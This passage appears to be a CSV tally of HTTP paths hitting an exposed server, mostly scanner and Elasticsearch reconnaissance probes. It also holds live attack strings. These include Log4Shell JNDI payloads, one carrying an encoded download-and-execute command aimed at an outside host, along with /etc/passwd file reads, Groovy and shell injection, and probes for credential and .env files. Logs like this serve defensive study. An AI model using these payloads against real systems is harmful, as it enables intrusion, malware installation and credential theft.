http.url,count
,172
/,13896
/*,94
/*/_settings,19
/+CSCOE+/logon.html,7
/.AWS_/credentials,6
/.DS_Store,9
/.aws/credentials,8
/.env,15
/.env.local,4
/.env.production,4
/.env.save,3
/.git/HEAD,12
/.git/config,14
/.gitconfig,2
/.json,9
/.vscode/sftp.json,3
/.well-known/security.txt,6
//_asterisk/Do.php,6
//admin/config.php,22
//assets/Do.php,7
//config.php,2
//libs/js/iframe.js,2
//recordings/Do.php,5
//recordings/index.php,2
//remote/login?lang=en,5
//vtigercrm/Do.php,6
/194.238.24.37.7z,3
/194.238.24.37.gz,3
/194.238.24.37.rar,3
/194.238.24.37.tar,3
/194.238.24.37.tar.gz,3
/194.238.24.37.zip,3
/198.7.118.34.7z,2
/198.7.118.34.gz,2
/198.7.118.34.rar,2
/198.7.118.34.tar,2
/198.7.118.34.tar.gz,2
/198.7.118.34.zip,2
/1cf0aa9d61f185b59f643939f862c01f89b21360,24
/1cf0aa9d61f185b59f643939f862c01f89b21360/_mapping,60
/1cf0aa9d61f185b59f643939f862c01f89b21360/_mapping?format=json,205
/1cf0aa9d61f185b59f643939f862c01f89b21360/_search,56
/1cf0aa9d61f185b59f643939f862c01f89b21360/_search?pretty,1
/1cf0aa9d61f185b59f643939f862c01f89b21360/_search?pretty=true,1
/1cf0aa9d61f185b59f643939f862c01f89b21360/_search?size=10&pretty=true,1
/1cf0aa9d61f185b59f643939f862c01f89b21360/_search?size=10000,1
/1cf0aa9d61f185b59f643939f862c01f89b21360/_search?size=3,4
/1cf0aa9d61f185b59f643939f862c01f89b21360/_stats,25
/?CAVIT,1
/?p=3232&wp_automatic=download&link=file:///etc/passwd,5
/?pretty,366
/?pretty=true&format=json,2
/?rest_route=/wp/v2/users/,1
/?x=${jndi:ldap://${:-285}${:-139}.${hostName}.uri.cvj970dqpia6vils81g0zxaiyjf5c6qtf.oast.online/a},1
/?x=${jndi:ldap://${:-568}${:-406}.${hostName}.uri.cvi8tvlqpiaade48ccr0cahe4k8q1bs1b.oast.fun/a},1
/?x=${jndi:ldap://${:-568}${:-406}.${hostName}.uri.cvi8tvlqpiaade48ccr0tmc9dxfzq5r55.oast.fun/a},1
/Admin/Admin.aspx,5
/ApiVer,11
/HNAP1,316
/Nmap/folder/check1726677907,1
/Nmap/folder/check1726909623,1
/Nmap/folder/check1727266306,1
/Nmap/folder/check1727694906,1
/Nmap/folder/check1727951899,1
/Nmap/folder/check1744438123,1
/Nmap/folder/check1744550941,1
/NmapUpperCheck1726677907,1
/NmapUpperCheck1726909623,1
/NmapUpperCheck1727266306,1
/NmapUpperCheck1727694906,1
/NmapUpperCheck1727951899,1
/NmapUpperCheck1744438123,1
/NmapUpperCheck1744550941,1
/Odin/http/call1721743692,1
/Odin/http/call1721743693,1
/Odin/http/call1721857683,1
/Odin/http/call1721904953,1
/Odin/http/call1721945345,1
/Odin/http/call1721945428,1
/Odin/http/call1722033370,1
/Odin/http/call1722034648,1
/Odin/http/call1722069986,1
/Odin/http/call1722149047,1
/Odin/http/call1722149982,1
/Odin/http/call1722239206,1
/Odin/http/call1722239929,1
/Odin/http/call1722295282,1
/Odin/http/call1722298541,1
/Odin/http/call1722358177,1
/Odin/http/call1722358321,1
/Odin/http/call1722417758,1
/Odin/http/call1722489898,1
/Odin/http/call1722576124,1
/Odin/http/call1722576633,1
/Odin/http/call1722602001,1
/Odin/http/call1722603915,1
/Odin/http/call1722617707,1
/Odin/http/call1722692329,1
/Odin/http/call1722693045,1
/Odin/http/call1722745115,1
/Odin/http/call1722788199,1
/Odin/http/call1722977350,1
/Odin/http/call1723119337,1
/Odin/http/call1723219653,1
/Odin/http/call1723220017,1
/Odin/http/call1723271146,1
/Odin/http/call1723271386,1
/Odin/http/call1723299331,1
/Odin/http/call1723300436,1
/Odin/http/call1723331496,1
/Odin/http/call1723343292,1
/Odin/http/call1723406320,1
/Odin/http/call1723462338,1
/Odin/http/call1723488112,1
/Odin/http/call1723545020,1
/Odin/http/call1723546629,1
/Odin/http/call1723551392,1
/Odin/http/call1723552614,1
/Odin/http/call1723604112,1
/Odin/http/call1723606208,1
/Odin/http/call1723616206,1
/Odin/http/call1723678321,1
/Odin/http/call1723693604,1
/Odin/http/call1723745067,1
/Odin/http/call1723745599,1
/Odin/http/call1723798169,1
/Odin/http/call1723802415,1
/Odin/http/call1723898390,1
/Odin/http/call1723976371,1
/Odin/http/call1723976397,1
/Odin/http/call1723984389,1
/Odin/http/call1723986445,1
/Odin/http/call1724015998,1
/Odin/http/call1724036312,1
/Odin/http/call1724073640,1
/Odin/http/call1724100140,1
/Odin/http/call1724170278,2
/Odin/http/call1724181167,1
/Odin/http/call1724181328,1
/Odin/http/call1724242948,1
/Odin/http/call1724243769,1
/Odin/http/call1724291628,1
/Odin/http/call1724292104,1
/Odin/http/call1724316320,1
/Odin/http/call1724368670,1
/Odin/http/call1724373436,1
/Odin/http/call1724423398,1
/Odin/http/call1724453530,1
/Odin/http/call1724652337,1
/Odin/http/call1724685159,1
/Odin/http/call1724687829,1
/Odin/http/call1724718640,1
/Odin/http/call1724755780,1
/Odin/http/call1724834741,1
/Odin/http/call1724881977,1
/Odin/http/call1724882658,1
/Odin/http/call1724888355,1
/Odin/http/call1724977162,1
/Odin/http/call1725096864,1
/Odin/http/call1725097679,1
/Odin/http/call1725131612,1
/Odin/http/call1725165932,1
/Odin/http/call1725166744,1
/Odin/http/call1725191213,1
/Odin/http/call1725192517,1
/Odin/http/call1725216982,1
/Odin/http/call1725265946,1
/Odin/http/call1725266851,1
/Odin/http/call1725323318,1
/Odin/http/call1725324338,1
/Odin/http/call1725341492,1
/Odin/http/call1725377399,1
/Odin/http/call1725396898,1
/Odin/http/call1725397198,1
/Odin/http/call1725449251,1
/Odin/http/call1725449667,1
/Odin/http/call1725469592,1
/Odin/http/call1725469990,1
/Odin/http/call1725516792,1
/Odin/http/call1725518285,1
/Odin/http/call1725539203,1
/Odin/http/call1725604696,1
/Odin/http/call1725621303,1
/Odin/http/call1725647793,1
/Odin/http/call1725682352,1
/Odin/http/call1725682356,1
/Odin/http/call1725713855,1
/Odin/http/call1725747345,1
/Odin/http/call1725766015,1
/Odin/http/call1725775936,1
/Odin/http/call1725837874,1
/Odin/http/call1725838501,1
/Odin/http/call1725840650,1
/Odin/http/call1725894594,1
/Odin/http/call1725896514,1
/Odin/http/call1725921932,1
/Odin/http/call1725923905,1
/Odin/http/call1725997087,1
/Odin/http/call1726064595,1
/Odin/http/call1726064794,1
/Odin/http/call1726132415,1
/Odin/http/call1726170611,1
/Odin/http/call1726218543,1
/Odin/http/call1726227905,1
/Odin/http/call1726496340,1
/Odin/http/call1726536697,1
/Odin/http/call1726538170,1
/Odin/http/call1726607096,1
/Odin/http/call1726621372,1
/Odin/http/call1726701385,1
/Odin/http/call1726701524,1
/Odin/http/call1726714058,1
/Odin/http/call1726891882,1
/Odin/http/call1726904229,1
/Odin/http/call1727069039,1
/Odin/http/call1727103065,1
/Odin/http/call1727128437,1
/Odin/http/call1727350688,1
/Odin/http/call1727597755,1
/Odin/http/call1727613901,1
/Odin/http/call1727881895,1
/Odin/http/call1727905751,1
/Odin/http/call1728094203,1
/Odin/http/call1728587089,1
/Odin/http/call1728649933,1
/Odin/http/call1729069399,1
/Odin/http/call1729986507,1
/Odin/http/call1730015600,1
/Odin/http/call1730311269,1
/Odin/http/call1730570758,1
/Odin/http/call1730814960,1
/Odin/http/call1730888404,1
/Odin/http/call1731014248,1
/Odin/http/call1731105356,1
/Odin/http/call1731228722,1
/Odin/http/call1731594070,1
/Odin/http/call1731796646,1
/Odin/http/call1731845705,1
/Odin/http/call1732054961,1
/Odin/http/call1732463283,1
/Odin/http/call1732479910,1
/Odin/http/call1732691443,1
/Odin/http/call1732722824,1
/Odin/http/call1732761686,1
/Odin/http/call1732869570,1
/Odin/http/call1732906935,1
/Odin/http/call1732989584,1
/Odin/http/call1733115466,1
/Odin/http/call1733153314,1
/Odin/http/call1733249738,1
/Odin/http/call1733322306,1
/Odin/http/call1733395360,1
/Odin/http/call1733489691,1
/Odin/http/call1733795942,1
/Odin/http/call1733800086,1
/Odin/http/call1733946548,1
/Odin/http/call1733953104,1
/Odin/http/call1734022069,1
/Odin/http/call1734073963,1
/Odin/http/call1734146817,1
/Odin/http/call1734225601,1
/Odin/http/call1734365650,1
/Odin/http/call1734380514,1
/Odin/http/call1734487040,1
/Odin/http/call1734751824,1
/Odin/http/call1734850584,1
/Odin/http/call1734951368,1
/Odin/http/call1735082794,1
/Odin/http/call1735109681,1
/Odin/http/call1735239746,1
/Odin/http/call1735491952,1
/Odin/http/call1735541431,1
/Odin/http/call1735656377,1
/Odin/http/call1735661835,1
/Odin/http/call1735982730,1
/Odin/http/call1736109340,1
/Odin/http/call1736455147,1
/Odin/http/call1736465953,1
/Odin/http/call1736721535,1
/Odin/http/call1736726425,1
/Odin/http/call1736796253,1
/Odin/http/call1736800835,1
/Odin/http/call1736903062,1
/Odin/http/call1737344983,1
/Odin/http/call1737349972,1
/Odin/http/call1737389778,1
/Odin/http/call1737697124,1
/Odin/http/call1737699697,1
/Odin/http/call1737912200,1
/Odin/http/call1738040203,1
/Odin/http/call1738248473,1
/Odin/http/call1738281567,1
/Odin/http/call1738426081,1
/Odin/http/call1738569844,1
/Odin/http/call1738578322,1
/Odin/http/call1738810250,1
/Odin/http/call1738849051,1
/Odin/http/call1738974230,1
/Odin/http/call1739003235,1
/Odin/http/call1739200404,1
/Odin/http/call1739206861,1
/Odin/http/call1739444240,1
/Odin/http/call1739516766,1
/Odin/http/call1739536268,1
/Odin/http/call1739643730,1
/Odin/http/call1739724852,1
/Odin/http/call1739798459,1
/Odin/http/call1739851325,1
/Odin/http/call1739882363,1
/Odin/http/call1739945970,1
/Odin/http/call1740104074,1
/Odin/http/call1740107765,1
/Odin/http/call1740242333,1
/Odin/http/call1740316093,1
/Odin/http/call1740325888,1
/Odin/http/call1740361223,1
/Odin/http/call1740517512,1
/Odin/http/call1740578374,1
/Odin/http/call1740645279,1
/Odin/http/call1740692497,1
/Odin/http/call1740800011,1
/Odin/http/call1740803820,1
/Odin/http/call1740970796,1
/Odin/http/call1740994053,1
/Odin/http/call1741016164,1
/Odin/http/call1741161595,1
/Odin/http/call1741236120,1
/Odin/http/call1741239867,1
/Odin/http/call1741384812,1
/Odin/http/call1741425252,1
/Odin/http/call1741431104,1
/Odin/http/call1741539808,1
/Odin/http/call1741572490,1
/Odin/http/call1741603719,1
/Odin/http/call1741773044,1
/Odin/http/call1741776535,1
/Odin/http/call1741852816,1
/Odin/http/call1741982382,1
/Odin/http/call1741997192,1
/Odin/http/call1742031125,1
/Odin/http/call1742253407,1
/Odin/http/call1742302268,1
/Odin/http/call1742396790,1
/Odin/http/call1742454081,1
/Odin/http/call1742491247,1
/Odin/http/call1742546438,1
/Odin/http/call1742627449,1
/Odin/http/call1742641202,1
/Odin/http/call1742779316,1
/Odin/http/call1742813086,1
/Odin/http/call1742878249,1
/Odin/http/call1742947592,1
/Odin/http/call1743066436,1
/Odin/http/call1743086102,1
/Odin/http/call1743301406,1
/Odin/http/call1743316339,1
/Odin/http/call1743335108,1
/Odin/http/call1743469929,1
/Odin/http/call1743537471,1
/Odin/http/call1743539621,1
/Odin/http/call1743655561,1
/Odin/http/call1743755130,1
/Odin/http/call1743757543,1
/Odin/http/call1743919493,1
/Odin/http/call1743959400,1
/Odin/http/call1743970235,1
/Odin/http/call1744030242,1
/Odin/http/call1744031082,1
/Odin/http/call1744103736,1
/Odin/http/call1744285057,1
/Odin/http/call1744381411,1
/Odin/http/call1744390026,1
/Odin/http/call1744533979,1
/Odin/http/call1744599546,1
/Odin/http/call1744607736,1
/Odin/http/call1744781724,1
/Odin/http/call1744811821,1
/Odin/http/call1744822364,1
/Odin/http/call1744929645,1
/Odin/http/call1744940764,1
/Odin/http/call1745047808,1
/OdinHttpCall1721743692,1
/OdinHttpCall1721743693,1
/OdinHttpCall1721857683,1
/OdinHttpCall1721904953,1
/OdinHttpCall1721945345,1
/OdinHttpCall1721945428,1
/OdinHttpCall1722033370,1
/OdinHttpCall1722034648,1
/OdinHttpCall1722069986,1
/OdinHttpCall1722149047,1
/OdinHttpCall1722149982,1
/OdinHttpCall1722239206,1
/OdinHttpCall1722239929,1
/OdinHttpCall1722295282,1
/OdinHttpCall1722298541,1
/OdinHttpCall1722358177,1
/OdinHttpCall1722358321,1
/OdinHttpCall1722417758,1
/OdinHttpCall1722489898,1
/OdinHttpCall1722576124,1
/OdinHttpCall1722576633,1
/OdinHttpCall1722602001,1
/OdinHttpCall1722603915,1
/OdinHttpCall1722617707,1
/OdinHttpCall1722692329,1
/OdinHttpCall1722693045,1
/OdinHttpCall1722745115,1
/OdinHttpCall1722788199,1
/OdinHttpCall1722977350,1
/OdinHttpCall1723119337,1
/OdinHttpCall1723219653,1
/OdinHttpCall1723220017,1
/OdinHttpCall1723271146,1
/OdinHttpCall1723271386,1
/OdinHttpCall1723299331,1
/OdinHttpCall1723300436,1
/OdinHttpCall1723331496,1
/OdinHttpCall1723343292,1
/OdinHttpCall1723406320,1
/OdinHttpCall1723462338,1
/OdinHttpCall1723488112,1
/OdinHttpCall1723545020,1
/OdinHttpCall1723546629,1
/OdinHttpCall1723551392,1
/OdinHttpCall1723552614,1
/OdinHttpCall1723604112,1
/OdinHttpCall1723606208,1
/OdinHttpCall1723616206,1
/OdinHttpCall1723678321,1
/OdinHttpCall1723693604,1
/OdinHttpCall1723745067,1
/OdinHttpCall1723745599,1
/OdinHttpCall1723798169,1
/OdinHttpCall1723802415,1
/OdinHttpCall1723898390,1
/OdinHttpCall1723976371,1
/OdinHttpCall1723976397,1
/OdinHttpCall1723984389,1
/OdinHttpCall1723986445,1
/OdinHttpCall1724015998,1
/OdinHttpCall1724036312,1
/OdinHttpCall1724073640,1
/OdinHttpCall1724100140,1
/OdinHttpCall1724170278,2
/OdinHttpCall1724181167,1
/OdinHttpCall1724181328,1
/OdinHttpCall1724242948,1
/OdinHttpCall1724243769,1
/OdinHttpCall1724291628,1
/OdinHttpCall1724292104,1
/OdinHttpCall1724316320,1
/OdinHttpCall1724368670,1
/OdinHttpCall1724373436,1
/OdinHttpCall1724423398,1
/OdinHttpCall1724453530,1
/OdinHttpCall1724652337,1
/OdinHttpCall1724685159,1
/OdinHttpCall1724687829,1
/OdinHttpCall1724718640,1
/OdinHttpCall1724755780,1
/OdinHttpCall1724834741,1
/OdinHttpCall1724881977,1
/OdinHttpCall1724882658,1
/OdinHttpCall1724888355,1
/OdinHttpCall1724977162,1
/OdinHttpCall1725096864,1
/OdinHttpCall1725097679,1
/OdinHttpCall1725131612,1
/OdinHttpCall1725165932,1
/OdinHttpCall1725166744,1
/OdinHttpCall1725191213,1
/OdinHttpCall1725192517,1
/OdinHttpCall1725216982,1
/OdinHttpCall1725265946,1
/OdinHttpCall1725266851,1
/OdinHttpCall1725323318,1
/OdinHttpCall1725324338,1
/OdinHttpCall1725341492,1
/OdinHttpCall1725377399,1
/OdinHttpCall1725396898,1
/OdinHttpCall1725397198,1
/OdinHttpCall1725449251,1
/OdinHttpCall1725449667,1
/OdinHttpCall1725469592,1
/OdinHttpCall1725469990,1
/OdinHttpCall1725516792,1
/OdinHttpCall1725518285,1
/OdinHttpCall1725539203,1
/OdinHttpCall1725604696,1
/OdinHttpCall1725621303,1
/OdinHttpCall1725647793,1
/OdinHttpCall1725682352,1
/OdinHttpCall1725682356,1
/OdinHttpCall1725713855,1
/OdinHttpCall1725747345,1
/OdinHttpCall1725766015,1
/OdinHttpCall1725775936,1
/OdinHttpCall1725837874,1
/OdinHttpCall1725838501,1
/OdinHttpCall1725840650,1
/OdinHttpCall1725894594,1
/OdinHttpCall1725896514,1
/OdinHttpCall1725921932,1
/OdinHttpCall1725923905,1
/OdinHttpCall1725997087,1
/OdinHttpCall1726064595,1
/OdinHttpCall1726064794,1
/OdinHttpCall1726132415,1
/OdinHttpCall1726170611,1
/OdinHttpCall1726218543,1
/OdinHttpCall1726227905,1
/OdinHttpCall1726496340,1
/OdinHttpCall1726536697,1
/OdinHttpCall1726538170,1
/OdinHttpCall1726607096,1
/OdinHttpCall1726621372,1
/OdinHttpCall1726701385,1
/OdinHttpCall1726701524,1
/OdinHttpCall1726714058,1
/OdinHttpCall1726891882,1
/OdinHttpCall1726904229,1
/OdinHttpCall1727069039,1
/OdinHttpCall1727103065,1
/OdinHttpCall1727128437,1
/OdinHttpCall1727350688,1
/OdinHttpCall1727597755,1
/OdinHttpCall1727613901,1
/OdinHttpCall1727881895,1
/OdinHttpCall1727905751,1
/OdinHttpCall1728094203,1
/OdinHttpCall1728587089,1
/OdinHttpCall1728649933,1
/OdinHttpCall1729069399,1
/OdinHttpCall1729986507,1
/OdinHttpCall1730015600,1
/OdinHttpCall1730311269,1
/OdinHttpCall1730570758,1
/OdinHttpCall1730814960,1
/OdinHttpCall1730888404,1
/OdinHttpCall1731014248,1
/OdinHttpCall1731105356,1
/OdinHttpCall1731228722,1
/OdinHttpCall1731594070,1
/OdinHttpCall1731796646,1
/OdinHttpCall1731845705,1
/OdinHttpCall1732054961,1
/OdinHttpCall1732463283,1
/OdinHttpCall1732479910,1
/OdinHttpCall1732691443,1
/OdinHttpCall1732722824,1
/OdinHttpCall1732761686,1
/OdinHttpCall1732869570,1
/OdinHttpCall1732906935,1
/OdinHttpCall1732989584,1
/OdinHttpCall1733115466,1
/OdinHttpCall1733153314,1
/OdinHttpCall1733249738,1
/OdinHttpCall1733322306,1
/OdinHttpCall1733395360,1
/OdinHttpCall1733489691,1
/OdinHttpCall1733795942,1
/OdinHttpCall1733800086,1
/OdinHttpCall1733946548,1
/OdinHttpCall1733953104,1
/OdinHttpCall1734022069,1
/OdinHttpCall1734073963,1
/OdinHttpCall1734146817,1
/OdinHttpCall1734225601,1
/OdinHttpCall1734365650,1
/OdinHttpCall1734380514,1
/OdinHttpCall1734487040,1
/OdinHttpCall1734751824,1
/OdinHttpCall1734850584,1
/OdinHttpCall1734951368,1
/OdinHttpCall1735082794,1
/OdinHttpCall1735109681,1
/OdinHttpCall1735239746,1
/OdinHttpCall1735491952,1
/OdinHttpCall1735541431,1
/OdinHttpCall1735656377,1
/OdinHttpCall1735661835,1
/OdinHttpCall1735982730,1
/OdinHttpCall1736109340,1
/OdinHttpCall1736455147,1
/OdinHttpCall1736465953,1
/OdinHttpCall1736721535,1
/OdinHttpCall1736726425,1
/OdinHttpCall1736796253,1
/OdinHttpCall1736800835,1
/OdinHttpCall1736903062,1
/OdinHttpCall1737344983,1
/OdinHttpCall1737349972,1
/OdinHttpCall1737389778,1
/OdinHttpCall1737697124,1
/OdinHttpCall1737699697,1
/OdinHttpCall1737912200,1
/OdinHttpCall1738040203,1
/OdinHttpCall1738248473,1
/OdinHttpCall1738281567,1
/OdinHttpCall1738426081,1
/OdinHttpCall1738569844,1
/OdinHttpCall1738578322,1
/OdinHttpCall1738810250,1
/OdinHttpCall1738849051,1
/OdinHttpCall1738974230,1
/OdinHttpCall1739003235,1
/OdinHttpCall1739200404,1
/OdinHttpCall1739206861,1
/OdinHttpCall1739444240,1
/OdinHttpCall1739516766,1
/OdinHttpCall1739536268,1
/OdinHttpCall1739643730,1
/OdinHttpCall1739724852,1
/OdinHttpCall1739798459,1
/OdinHttpCall1739851325,1
/OdinHttpCall1739882363,1
/OdinHttpCall1739945970,1
/OdinHttpCall1740104074,1
/OdinHttpCall1740107765,1
/OdinHttpCall1740242333,1
/OdinHttpCall1740316093,1
/OdinHttpCall1740325888,1
/OdinHttpCall1740361223,1
/OdinHttpCall1740517512,1
/OdinHttpCall1740578374,1
/OdinHttpCall1740645279,1
/OdinHttpCall1740692497,1
/OdinHttpCall1740800011,1
/OdinHttpCall1740803820,1
/OdinHttpCall1740970796,1
/OdinHttpCall1740994053,1
/OdinHttpCall1741016164,1
/OdinHttpCall1741161595,1
/OdinHttpCall1741236120,1
/OdinHttpCall1741239867,1
/OdinHttpCall1741384812,1
/OdinHttpCall1741425252,1
/OdinHttpCall1741431104,1
/OdinHttpCall1741539808,1
/OdinHttpCall1741572490,1
/OdinHttpCall1741603719,1
/OdinHttpCall1741773044,1
/OdinHttpCall1741776535,1
/OdinHttpCall1741852816,1
/OdinHttpCall1741982382,1
/OdinHttpCall1741997192,1
/OdinHttpCall1742031125,1
/OdinHttpCall1742253407,1
/OdinHttpCall1742302268,1
/OdinHttpCall1742396790,1
/OdinHttpCall1742454081,1
/OdinHttpCall1742491247,1
/OdinHttpCall1742546438,1
/OdinHttpCall1742627449,1
/OdinHttpCall1742641202,1
/OdinHttpCall1742779316,1
/OdinHttpCall1742813086,1
/OdinHttpCall1742878249,1
/OdinHttpCall1742947592,1
/OdinHttpCall1743066436,1
/OdinHttpCall1743086102,1
/OdinHttpCall1743301406,1
/OdinHttpCall1743316339,1
/OdinHttpCall1743335108,1
/OdinHttpCall1743469929,1
/OdinHttpCall1743537471,1
/OdinHttpCall1743539621,1
/OdinHttpCall1743655561,1
/OdinHttpCall1743755130,1
/OdinHttpCall1743757543,1
/OdinHttpCall1743919493,1
/OdinHttpCall1743959400,1
/OdinHttpCall1743970235,1
/OdinHttpCall1744030242,1
/OdinHttpCall1744031082,1
/OdinHttpCall1744103736,1
/OdinHttpCall1744285057,1
/OdinHttpCall1744381411,1
/OdinHttpCall1744390026,1
/OdinHttpCall1744533979,1
/OdinHttpCall1744599546,1
/OdinHttpCall1744607736,1
/OdinHttpCall1744781724,1
/OdinHttpCall1744811821,1
/OdinHttpCall1744822364,1
/OdinHttpCall1744929645,1
/OdinHttpCall1744940764,1
/OdinHttpCall1745047808,1
/__screenshot-error?file=/etc/passwd,5
/_alias,47
/_aliases,188
/_all/_mapping,571
/_all/_search,7
/_all/_search?q=bitcoin&size=5,2
/_all/_search?q=private_key&size=5,2
/_all/_search?q=privatekey&size=5,2
/_all/_search?q=privkey&size=5,2
/_all/_stats,1
/_all_dbs,1
/_asterisk/graph.php,30
/_asterisk/phpversions.php,20
/_cat,5
/_cat/aliases?format=json&h=alias,90
/_cat/health?format=json,54
/_cat/indices,334
"/_cat/indices?bytes=b&format=json&h=health,status,index,pri.store.size,docs.count,docs.deleted,store.size,creation.date.string",2
/_cat/indices?format=json,2734
/_cat/indices?format=json&bytes=b,245
"/_cat/indices?format=json&bytes=b&h=health,status,index,pri.store.size,docs.count,docs.deleted,store.size,creation.date.string",54
/_cat/indices?format=json&bytes=mb,3
/_cat/indices?format=json&h=index,93
/_cat/indices?format=json&pretty,13
/_cat/indices?format=text&v=true,5
"/_cat/indices?h=index,docs.count&bytes=mb&format=json",4
/_cat/indices?v,126
/_cat/indices?v&format=json,23
/_cat/indices?v=true,26
/_cat/nodes?format=json,106
/_cluster/health,9
/_cluster/health?level=indices,180
/_cluster/health?pretty,316
"/_cluster/state/nodes,routing_table",19
/_cluster/stats,717
/_count,1
/_mapping,7
/_nodes,748
/_nodes/_local,62
/_profiler/phpinfo,8
/_search,482
/_search?a=${jndi:ldap://81.70.97.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vMTAzLjE3OC41Ny4yMzQ6NTQ1MC9sbDY0O2NobW9kIDc3NyBsbDY0Oy4vbGw2NDtybSAtciBsbDY0O3dnZXQgaHR0cDovLzEwMy4xNzguNTcuMjM0OjU0NTAvbGw4NjtjaG1vZCA3NzcgbGw4NjsuL2xsODY7cm0gLXIgbGw4Ng==},3
/_security/user,40
/_stats,84
/_stats/indices,175
/_stats/store/?pretty&human&level=cluster,106
/_stats?pretty,3
/_status,175
/a2billing/admin/Public/graph.php,9
/a2billing/admin/Public/index.php,8
/a2billing/admin/Public/phpversions.php,7
/aaa9,177
/aab8,147
/aab9,37
/about,1
/access/set?param=enableapi&value=1,5
/admin/.env,3
/admin/assets/js/views/login.js,18
/admin/config.php,15
/admin/i18n/readme.txt,7
/admin/index.html,8
/admin/modules/core/ajax.php,8
/admin/modules/core/graph.php,16
/admin/views/config.php,9
/admin/views/graph.php,20
/agc/css/custom.css,1
/api,1
/api/.env,8
/api/env,3
/api/geojson?url=file:///etc/hosts,6
/api/shared/config/config.env,4
/api/v1/markdown/link:metadata?link=http://localhost:13042,5
/app/.env,3
/apps/.env,3
/assets,11
/assets/graph.php,20
/assets/phpversions.php,22
/axis2-admin/,2
/axis2/,2
/axis2/axis2-admin/,2
/backend/.env,3
/backup.7z,5
/backup.gz,5
/backup.rar,5
/backup.tar,5
/backup.tar.gz,5
/backup.zip,5
/bin.7z,5
/bin.gz,5
/bin.rar,5
/bin.tar,5
/bin.tar.gz,5
/bin.zip,5
/bin/bin.7z,5
/bin/bin.gz,5
/bin/bin.rar,5
/bin/bin.tar,5
/bin/bin.tar.gz,5
/bin/bin.zip,5
"/bin/get/Main/SolrSearch?media=rss&text=}}}{{async async=false}}{{groovy}}println(""cat /etc/passwd"".execute().text){{/groovy}}{{/async}} ",7
/blog/.env,3
/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=';id;',5
/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig,5
/cgi-bin/authLogin.cgi,310
/cgi-bin/login.cgi,6
/cgi/conf.bin,2
/classes/common/busiFacade.php,10
/clients/MyCRL,5
/config.js,4
/config.json,92
/config.properties,3
/config/.env,4
/contact/,4
/core/.env,3
/crm/.env,3
/cslu/v1/scheduler/jobs,5
/cslu/v1/var/logs/customer-cslu-lib-log.log,5
/data.7z,5
/data.gz,5
/data.rar,5
/data.tar,5
/data.tar.gz,5
/data.zip,5
/db18744ea5570fa9bf868df44fecd4b58332ff24,22
/db18744ea5570fa9bf868df44fecd4b58332ff24/_mapping,60
/db18744ea5570fa9bf868df44fecd4b58332ff24/_search,56
/db18744ea5570fa9bf868df44fecd4b58332ff24/_search?pretty,1
/db18744ea5570fa9bf868df44fecd4b58332ff24/_search?pretty=true,1
/db18744ea5570fa9bf868df44fecd4b58332ff24/_search?size=10&pretty=true,1
/db18744ea5570fa9bf868df44fecd4b58332ff24/_search?size=10000,1
/db18744ea5570fa9bf868df44fecd4b58332ff24/_stats,25
/debug/default/view?panel=config,1
/device/config,5
/digium_phones/ajax.php,6
/django/.env,4
/doc/index.html,9
/docker-compose.yaml,2
/docker-compose.yml,2
/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application,1
/etc/hosts,6
/etc/passwd,5
/evox/about,315
/favicon.ico,3294
/fhir-server/api/v4/metadata,2
/fhir/metadata,2
/file=/etc/passwd,5
/file=c:\windows\win.ini,5
/file=http://oast.pro,5
/filex/read-raw?url=http://oast.me&cut=1,5
/flask/.env,4
/goanywhere/images/..;/wizard/InitialAccountSetup.xhtml,5
/graph.php,15
/hazelcast/rest/cluster,1
/html.7z,5
/html.gz,5
/html.rar,5
/html.tar,5
/html.tar.gz,5
/html.zip,5
/httpd.conf,3
/idx_config/,6
/index.html,7
/index.js,2
/index.php,4
/index.php/display/status_zigbee,5
/info,3
/info.php,14
/interview?i=/etc/passwd,5
/karma.conf.json,8
/laravel/.env,3
/library/.env,3
/local/.env,3
/login.action,6
/login.jsp,8
/logon.htm,8
/manage/account/login,7
/metadata,4
/new/.env,3
/next/.env,4
"/nice ports,/Trinity.txt.bak",37
/nmaplowercheck1726677907,1
/nmaplowercheck1726909623,1
/nmaplowercheck1727266306,1
/nmaplowercheck1727694906,1
/nmaplowercheck1727951899,1
/nmaplowercheck1728116053,2
/nmaplowercheck1744438123,1
/nmaplowercheck1744550941,1
/nuxt/.env,4
/odinhttpcall1721743692,1
/odinhttpcall1721743693,1
/odinhttpcall1721857683,1
/odinhttpcall1721904953,1
/odinhttpcall1721945345,1
/odinhttpcall1721945428,1
/odinhttpcall1722033370,1
/odinhttpcall1722034648,1
/odinhttpcall1722069986,1
/odinhttpcall1722149047,1
/odinhttpcall1722149982,1
/odinhttpcall1722239206,1
/odinhttpcall1722239929,1
/odinhttpcall1722295282,1
/odinhttpcall1722298541,1
/odinhttpcall1722358177,1
/odinhttpcall1722358321,1
/odinhttpcall1722417758,1
/odinhttpcall1722489898,1
/odinhttpcall1722576124,1
/odinhttpcall1722576633,1
/odinhttpcall1722602001,1
/odinhttpcall1722603915,1
/odinhttpcall1722617707,1
/odinhttpcall1722692329,1
/odinhttpcall1722693045,1
/odinhttpcall1722745115,1
/odinhttpcall1722788199,1
/odinhttpcall1722977350,1
/odinhttpcall1723119337,1
/odinhttpcall1723219653,1
/odinhttpcall1723220017,1
/odinhttpcall1723271146,1
/odinhttpcall1723271386,1
/odinhttpcall1723299331,1
/odinhttpcall1723300436,1
/odinhttpcall1723331496,1
/odinhttpcall1723343292,1
/odinhttpcall1723406320,1
/odinhttpcall1723462338,1
/odinhttpcall1723488112,1
/odinhttpcall1723545020,1
/odinhttpcall1723546629,1
/odinhttpcall1723551392,1
/odinhttpcall1723552614,1
/odinhttpcall1723604112,1
/odinhttpcall1723606208,1
/odinhttpcall1723616206,1
/odinhttpcall1723678321,1
/odinhttpcall1723693604,1
/odinhttpcall1723745067,1
/odinhttpcall1723745599,1
/odinhttpcall1723798169,1
/odinhttpcall1723802415,1
/odinhttpcall1723898390,1
/odinhttpcall1723976371,1
/odinhttpcall1723976397,1
/odinhttpcall1723984389,1
/odinhttpcall1723986445,1
/odinhttpcall1724015998,1
/odinhttpcall1724036312,1
/odinhttpcall1724073640,1
/odinhttpcall1724100140,1
/odinhttpcall1724170278,2
/odinhttpcall1724181167,1
/odinhttpcall1724181328,1
/odinhttpcall1724242948,1
/odinhttpcall1724243769,1
/odinhttpcall1724291628,1
/odinhttpcall1724292104,1
/odinhttpcall1724316320,1
/odinhttpcall1724368670,1
/odinhttpcall1724373436,1
/odinhttpcall1724423398,1
/odinhttpcall1724453530,1
